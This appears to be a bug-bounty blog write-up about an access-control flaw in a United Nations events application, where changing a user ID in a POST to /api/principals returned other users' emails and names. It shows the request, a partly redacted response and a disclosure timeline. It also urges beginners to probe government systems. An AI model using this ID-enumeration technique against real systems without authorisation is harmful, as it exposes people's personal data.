---
title: 1 Million users PII Leak :&nbsp;Hacking United Nations
categories:
- write-ups
excerpt: |
  My experience of finding a critical API miconfiguration in the United Nations system which could lead to leak over 1 Million users Personal Identifiable Information.. In this blog post, i’ll explain all the technical part and non-technical parts of it.
image: "https://picsum.photos/2560/600?image=733"
---

> My Experience of hacking into United Nations & finding a critical API misconfiguration in their systems which could lead to leak over 1 Million users PII. In this blog post, I’ll explain all the technical part and non-technical parts of it.

- Yeah, So I found two major PII leaks in the United Nations system, 1st Leak(38,000+ users) is dicovered & reported by another researcher & the 2nd leak(1 Million+ users) is discovered & reported by me. 

### My Approach?

1 - So, as you might know, I don't put so much time in recon & all of that stuff. Hence In this case I did the same.

2 - Hence, I tried very basic google dorks to discover some functional assets & eventually found some of them.

3 - My Burp was running in the background, I authorized my self to the application & started testing various functionalities.

4 - The application is responsible for organizing events in the united nations. So there are various functionalities to test.

5 - Found an API endpoint, where it loads the user data via numeric user-id. changing my user-id to someone else user-id will result in information disclosure. 

### How I discovered PII leak.

- There is **favourites** section, where users can add what ever they like. When visiting the favorite section **`/user/favourite`**
- It loads an API endpoint the background i..e **`/api/principals`**, lacks proper access controls, leading to the disclosure of users PII. When accessed with any other valid user ID, the endpoint returns detailed user data, including email addresses, without requiring authentication or authorization.
##### Request 

```r
POST /api/principals HTTP/1.1
Host: █████.un.org
...snip...
Connection: close

{
    "values":[
        "User:{USER-ID}"
        ]
    }
```

##### Response

```r
HTTP/1.1 200 OK
Server: nginx/1.20.1
...snip...
Connection: close

{
    "User:1459327":{
        "affiliation":"Jele█████",
        "affiliation_id":null,
        "affiliation_meta":null,
        "avatar_url":"/user/{user-id}/avatar-hash}",
        "detail":"jele█████31@gmail.com (Jele█████)",
        "email":"jele█████31@gmail.com",
        "first_name":"Jele█████",
        "identifier":"User:1459327",
        "invalid":false,
        "last_name":"█████████",
        "name":"Jele█████ ██████████",
        "title":"none",
        "type":"user",
        "user_id":1459327
        }
    }
```

### Impact

- PII Exposure: More than 1 Million users PII, including email addresses, are exposed to unauthorized access.
- Privacy Violation: Users privacy is compromised, potentially leading to identity theft, phishing attacks, and other malicious activities.
- Compliance Risks: This vulnerability may violate data protection regulations such as GDPR, CCPA, and others, resulting in legal consequences and financial penalties for the organization.

### Conclusion
- It took me about 20 minutes to find this critical API miconfiguration. I didn't perform so much recon, automation ..etc. Just picked-up one asset from google dorks & Start hacking on it. 
- If you're just starting out in hacking, try to find vulnerabilites in governments systems, they are much vulnerable than you think.

#### Timeline
- Reported -> 15/July/2024
- Fixed -> 16/July/2024 & they wanted to meet me in person on a call.

<img src="/assets/logos/first.png" alt="first_response" width="1000" height="auto">

- In personal Call with head of unit & Letter Of Appreciation -> 18/July/2024

<img src="/assets/logos/appr1.png" alt="first_response" width="400" height="auto">
